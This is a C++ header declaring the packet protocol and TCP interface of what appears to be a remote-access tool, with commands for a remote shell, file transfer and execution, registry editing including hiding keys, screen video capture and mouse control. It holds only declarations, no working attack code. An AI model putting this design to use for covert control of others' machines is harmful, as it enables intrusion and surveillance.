#pragma once

#include <WinSock2.h>
#include <Mstcpip.h>
#include <WS2tcpip.h>
#include <string>
#include <queue>
#include <memory>
#include <utility>
#include <array>

#define MAGIC_START 0xA45A2D9F

enum class PacketDataTypes : uint32_t {
	ping_send = 1,
	ping_acknowledged = 2,
	close_client = 3,
	authentificate = 4,
	abort = 5,

	tcp_error_debugging = 6,	// tcp layer error (e.g. packet shifting)
	com_error_debugging = 7,	// user defined errors used in higher level (HorizonClient)
	com_notification = 8,		// user defined notification used in custom code

	load_component = 9,
	free_component = 10,

	flags_cancel_operation = 11,
	flags_cancelled_operation = 12,

	start_chunked_operation = 13,
	stop_chunked_operation = 14,
	process_chunk_operation = 15,

	// SHELL COMMANDS
	shell_init = 16,
	shell = 17,

	// FTP TRANSACTION COMMANDS
	enum_drives = 18,
	enum_folders_and_files = 19,
	download_file = 20,
	download_folder = 21,
	download_folder_end = 22,
	delete_folder = 23,
	delete_file = 24,
	rename = 25,
	create_folder = 26,
	create_file = 27,
	upload_file = 28,
	run = 29,

	// REGEDIT TRANSASCTION
	enum_keys = 30,
	enum_values = 31,
	rename_key = 32,
	delete_key = 33,
	hide_key = 34,
	create_key = 35,
	create_value = 36,

	// VIDEO TRANSASCTION
	video_init = 37,
	video_frame = 38,
	video_start = 39,
	video_end = 40,

	// MOUSE TRANSASCTION
	mouse_start = 41,
	mouse_pos = 42,
	mouse_click_left = 43,
	mouse_click_right = 44
};

#pragma pack(push, 1)
struct PACKET_HEADER {
	uint64_t magic_start = MAGIC_START;
	uint64_t packet_size = 0;
	uint32_t data_type = 0;
	char arguments[1024] = { 0 };
	uint64_t checksum = 0;

	// This token is NOT null terminated
	char token[16];
};
#pragma pack(pop)

struct paramStruct {
	char pName[20];
	char pValue[1024];
};

const int ERR_TCP_CLOSED = 12;
const int SUCC = 10;
const int ERR_SHIFT = 11;

typedef std::array<char, 16> TOKEN_KEY;


class TcpInterface {
private:
	static std::queue<std::string> errors;	//errors logged...sent on first contact with server (send or receive). Static because it is connection persistent
	static std::queue<std::string> notifications;	//notifications logged...different than error because they are not connection-persistent

	SOCKET internal_socket = 0;
	uint64_t must_recv = 0;
	uint64_t must_send = 0;

	//Send and on error automatically close connection
	bool sendall(SOCKET s, const char* buffer, uint64_t len);

	//Receive and on error automatically close connection
	bool readall(SOCKET s, char* buffer, uint64_t len);
	bool isPacketValid(PACKET_HEADER* head);

	int fixSendShift();
	int fixRecvShift();

	//Simple send header code without reporting function
	//Send the packet without any checks for shifting
	int internalSendPacketHeader(PACKET_HEADER* head);

	void generateShiftError(bool send_side, PACKET_HEADER* sample_head, int err_line);
	void generateDataError(bool send_side, uint64_t sample_len, int err_line);

public:
	TcpInterface() {}
	TcpInterface(SOCKET s);

	//Use this for unsecured connections
	void setRecvTimeout(bool set);
	void closeConnection();
	bool isClosed();

	void generateNotification(std::string arguments);

	//Send header and eventually automatically fix shifts
	int sendPacketHeader(PACKET_HEADER* head, int line);
	int sendPacketData(const char* data, uint64_t len, int line);

	int recvPacketHeader(PACKET_HEADER* head, int line);
	int recvPacketData(char* buffer, uint64_t len, int line);

	//Sends reports about the internal status: errors
	//Does not fix shifts. A SUCCESS result does NOT mean packets were sent.
	int sendReports();

	bool dataAvailable(int seconds);
};


//Packet params utilities
std::vector<paramStruct> configureParameterSets(char command[1024]);
std::string getPacketParamValue(char data[1024], const char searchParam[20]);


//Set header. If token is NULL it is default initialized
std::unique_ptr<PACKET_HEADER> createHeader(PacketDataTypes data_type, uint64_t size, std::string arguments,const TOKEN_KEY& token);
std::unique_ptr<PACKET_HEADER> createHeader(PacketDataTypes data_type, uint64_t size, std::string arguments);